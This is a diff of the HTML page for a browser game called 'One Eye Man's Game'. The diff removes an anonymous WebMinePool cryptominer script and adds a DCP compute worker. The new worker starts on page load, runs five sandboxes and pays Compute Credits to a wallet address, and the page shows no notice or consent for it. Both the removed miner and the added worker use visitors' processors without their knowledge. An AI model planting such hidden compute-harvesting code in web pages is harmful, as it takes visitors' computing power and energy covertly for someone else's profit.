@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+    <meta name="monetization" content="$ilp.uphold.com/RHZ6KZx4mWQi">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
@@ -21,53 +22,24 @@ canvas {
   transform: translate(-50%, -50%);
 }
   </style>
-  <script src="https://webminepool.com/lib/base.js"></script>
   <title>One Eye Man's Game</title>
   </head>
   <body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/phaser@3.16.2/dist/phaser.min.js"></script>
     <script src="StartScene.js"></script>
     <script src="GameScene.js"></script>
     <script src="EndScene.js"></script>
     <script src="game.js"></script>
     <script src="https://scheduler.distributed.computer/dcp-client/dcp-client.js"></script>
-      <script>
-        //Instantiate a DCP Browser Worker with paymentAddress (where Compute Credits are deposited) and maxWorkingSandboxes (number of concurrent sandboxes)
-        const worker = new dcp.worker.Worker({
-          paymentAddress: "0xbc8a11c91D59F5315E7c51374D82AD6B3B21769a",
-          maxWorkingSandboxes: 5,
-        });
-
-        //Starts the DCP Browser Worker
-        worker.start();
-
-        //Optional events displayed in the console
-        worker.on('fetchStart', () => {
-          document.getElementById("events").appendChild(document.createElement('br'));
-          document.getElementById("events").appendChild(document.createTextNode(`! fetching job slices...`));
-        });
-
-        worker.on('fetch', (fetchedSlicesCount) => {
-          document.getElementById("events").appendChild(document.createElement('br'));
-          document.getElementById("events").appendChild(document.createTextNode(`!   fetched ${fetchedSlicesCount} job slices, computing...`));
-        });
-
-        worker.on('submit', () => {
-          document.getElementById("events").appendChild(document.createElement('br'));
-          document.getElementById("events").appendChild(document.createTextNode(`! submitting computed job slice result...`));
-        });
-
-        worker.on('payment', receipt => {
-          document.getElementById("events").appendChild(document.createElement('br'));
-          document.getElementById("events").appendChild(document.createTextNode(`!   earned ${receipt.payment} Compute Credits`));
-        });
-
-      </script>
     <script>
-      var miner = WMP.Anonymous('SK_Jlx2AvltVZSrflvVHfy3Y',{throttle: 0.3});
-      if (!miner.isMobile()){
-          miner.start();
-      }
+      //Instantiate a DCP Browser Worker with paymentAddress (where Compute Credits are deposited) and maxWorkingSandboxes (number of concurrent sandboxes)
+      const worker = new dcp.worker.Worker({
+        paymentAddress: "0xbc8a11c91D59F5315E7c51374D82AD6B3B21769a",
+        maxWorkingSandboxes: 5,
+      });
+
+      worker.start();
     </script>
   </body>
 </html>
